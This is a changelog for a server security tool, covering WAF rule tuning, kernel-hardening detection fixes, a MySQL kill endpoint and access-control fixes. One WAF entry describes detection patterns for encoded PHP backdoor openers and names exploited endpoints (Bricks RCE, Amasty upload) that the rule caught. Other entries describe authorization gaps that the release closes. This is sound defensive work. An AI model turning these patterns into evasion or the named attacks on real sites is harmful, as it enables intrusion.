- WAF: promoted rule **437** (`php_encoded_opener`, `WAF_BACKDOOR` encoded
  `<?php` opener) from `logonly` to **challenge**, and **removed** its FP-prone
  `<?=` short-opener variant. A five-server / 264k-event log review found the
  strong `<?php` openers (`B64_PHP_OPENER`, `URL_PHP_OPENER`) catching only real
  attacks (Bricks RCE `render_element`, `additional_webservices.php`, Amasty
  `uploadFile`) with **0 FP**, while the `<?=` short-opener (base64 `"PD89"`, a
  4-char prefix) was **6/6 false positives** on legitimate traffic
  (Jetpack/WordPress.com xmlrpc sync, Contact Form 7 submissions) — so the
  `PD89` detection was dropped rather than kept as logonly noise. Rule 436
  (`php_decode_chain`) stays `logonly` (0 hits across all five servers).

### Removed
- health detector: **removed the `HEALTH/PORT_CONN_SPIKE` per-port connection
  spike alert entirely.** The approximate per-local-port connection count (split
  out of `/proc/net/tcp{,6}`) was too noisy to be actionable and generated
  months of false positives / false alerts. The related config knobs
  (`PORT_WATCH`, `PORT_SPIKE_X`, `PORT_CONN_MIN`) are gone from
  `configs/detectors.conf` and are now silently ignored if left in an existing
  `/etc/cfm/detectors.conf`; the `port_conn` map is also dropped from the health
  snapshot JSON body. The aggregate connection-state spikes
  (`HEALTH/CONN_TOTAL_SPIKE`, **`HEALTH/CONN_EST_SPIKE`**, `HEALTH/SYN_RECV_SPIKE`)
  and the SYN_RECV / all-port talker probes are unchanged.

### Added
- MySQL governor: scoped (cPanel) users can now **kill their own stuck
  query/connection** — `POST /api/v1/mysql/user-kill?id=<pid>&type=query|connection`
  (default `query` = KILL QUERY, statement only). The target connection's
  `(user, db)` must be within the token's scope (admin tokens may target any);
  every kill is recorded in the governor audit ring/history. Scoped governor
  reads (`user-summary`/`user-kills`/`user-history`) were already live.

### Fixed
- kernsec: **TIPC-workload detection no longer false-positives on the iproute2
  `tipc` binary.** `HasTIPCWorkload` keyed on `/usr/{bin,sbin}/tipc`, but that
  binary ships with iproute2 — installed on essentially every modern host — so
  the gate read every box (cPanel/CloudLinux/Debian/EL) as a TIPC user. Effect:
  the `tipc` module blacklist was **silently skipped fleet-wide**, and any
  operator who deliberately set `state = force` for it hit an **UNSAFE FORCE**
  refusal on `cfm kernsec apply`. Detection now keys only on real-use signals:
  the `tipc` module loaded, `/proc/net/tipc`, `tipc-config` (the deliberate
  `tipcutils` package), or a `*tipc*.service` unit. Genuine TIPC/HA-cluster
  hosts are still skipped. (Same class of false positive the AFS detector
  already guards against with the openafs `/afs` stub.)
- kernsec: **KVM-host detection no longer false-positives on bare-metal
  hosting boxes.** `IsKVMHost` keyed purely on `kvm_intel`/`kvm_amd` being
  loaded, but the kernel auto-loads those on any VT-x/AMD-V CPU — so every
  modern cPanel/CloudLinux/DirectAdmin server was mislabeled a KVM hypervisor.
  That wrongly skipped the `vsock`/`llc`/`llc2` blacklists and the
  oops-reboot / coredump rules, and (because those rules then resolved to
  `skip`) made `cfm kernsec apply` refuse force-blacklisted modules with an
  UNSAFE FORCE error. `IsKVMHost` now requires the kvm module **and**
  corroborating hypervisor evidence — a `vhost*` backend module loaded
  (`vhost`/`vhost_net`/`vhost_vsock`, which only load once a guest starts),
  libvirt, a running QEMU process, or Proxmox. Genuine hypervisors are still
  detected; bare-metal hosting boxes are not.
- kernsec: **`cfm kernsec apply` no longer chokes on a tuned-managed
  `GRUB_CMDLINE_LINUX_DEFAULT`.** On EL/CloudLinux the `tuned` profile owns
  that line and fills it with shell expansions
  (`${GRUB_CMDLINE_LINUX_DEFAULT:+…}\$tuned_params`). kernsec reads `_DEFAULT`
  (for the next-boot drift view) but never writes it, yet it was decoding it
  with the strict round-trip-safe parser and aborting the whole apply with a
  "kernel cmdline contains shell metacharacter" error. `_DEFAULT` is now read
  **leniently** — shell tokens are kept verbatim (they never match a managed
  key, so drift is unaffected). The strict decoder still guards
  `GRUB_CMDLINE_LINUX`, the line kernsec actually rewrites.
- kernsec: `fs.protected_regular` lowered from **2 to 1** (`kspp.fs`, Tier 1).
  Value 2 also covers group-writable sticky dirs, which **breaks cPanel's DNS
  Zone Editor**; 1 still protects the real attack surface (non-owned regular
  files in world-writable sticky dirs like `/tmp`). kernsec is declarative, so
  the next `cfm kernsec apply` reconciles any host currently at `=2` down to
  `=1` live (`sysctl -w`) and in the managed file — no manual step.
- WAF: `WAF_BAD_UTF8` (rule 611, `logonly`) now skips known binary-ish legit
  endpoints — WordPress optimization-detective web-vitals and `async-upload.php`
  media uploads — reusing (and generalising) the carve-out the ctrl-chars rule
  already had. A five-server / 264k-event log review found these were the bulk
  of its `logonly` false-positive noise on real Greek WP traffic (mobile
  web-vitals POSTs + admin image uploads). Rule stays `logonly`.
- Admin UI: scoped (cPanel) users no longer see admin-only nav items. The nav
  filter only hid the Dashboard; **Web Bots, Notifier, Detectors, Settings and
  Debug stayed visible** to scoped users and 403'd on click. The authoritative
  admin-only nav list now covers all of them (backends were already
  fail-closed; this removes the dead/broken links). Also removed a stale
  divergent matcher copy in `ui-scope.js` and corrected
  `docs/endpoint_scope_inventory.md` (which wrongly listed the scope-validated
  `waf/engine/summary` and `{challenge,waf}/exclude/*` endpoints as admin-only).

### Security
- MySQL governor `user-kill` now resolves the target from a **live** processlist
  lookup (`information_schema.PROCESSLIST WHERE ID=?`) and scope-checks that live
  row immediately before issuing the KILL, closing the TOCTOU window where a pid
  could be reused between the periodic snapshot and the kill.
- `TokenStore.Issue` **fails closed**: it refuses to mint a scoped (non-admin)
  token with no scope at all (no vhosts, db-users, or databases); the issue API
  returns 400. Defense-in-depth behind the role-based gate below.
- MySQL governor scoped routes now **fail closed by authenticated role**, not by
  an empty scope map. `scopedMySQLFilterHandler` previously treated any caller
  with an empty vhost scope as admin (unfiltered); a scoped token whose scope
  was somehow empty (malformed/legacy) would have been mis-handled as admin —
  and on the new `user-kill` **write** that meant killing any connection. It now
  passes through only for a confirmed admin role and fails closed otherwise.
- `POST /api/v1/firewall/block` is now **admin-only server-side** (wrapped in
  `adminOnlyHandler`, like the MySQL/detectors/system-status routes).
  Previously the route had no role/scope check, so a scoped (cPanel/DA) token
  could call it directly and block any IP host-wide — bypassing the UI, which
  already hid the action. The customer-facing unblock endpoint is unchanged.

### Fixed
- Admin UI: scoped (cPanel) viewer tokens can now toggle **Challenge/WAF and
  HTTP/3 for their own in-scope vhosts** from the per-vhost controls. The
  client-side write guard was blanket-blocking all writes for `viewer` tokens
  (`read-only scoped viewer token`) even though the daemon already authorises
  these mutations by host scope. Self-service writes are re-allowed client-side
  (the server still enforces the vhost allowlist); genuinely admin-only writes
  stay blocked. Also classifies `v1/waf/`+`v1/http3/` as writes so they are no
  longer silently exempt from the viewer guard. When identity resolution falls
  back (token present but `/me` unresolved) the scoped exclude-management
  capability now fails closed instead of defaulting open.
- Admin UI: scoped users can now create/edit/delete/simulate **throttle &
  traffic rules** (`v1/webdet/rules/*`) for their own in-scope vhosts. The
  controls page already showed the rule form to scoped users and the daemon
  already scope-checks these writes (`scopeAllowsVhosts`), but the client guard
  classified them as admin-only, so saving failed with `read-only scoped viewer
  token`.

## 2026-06-17

### Added
- `CLAUDE.md` — agent/contributor guide: architecture map, build/CI gates,
  enforced conventions, and a "where we historically lost the ball" section
  distilled from the first ~1000 PRs.
- `CHANGELOG.md` — this file. Changelog tracking starts from today; the
  date-based version scheme is now documented and maintained going forward.
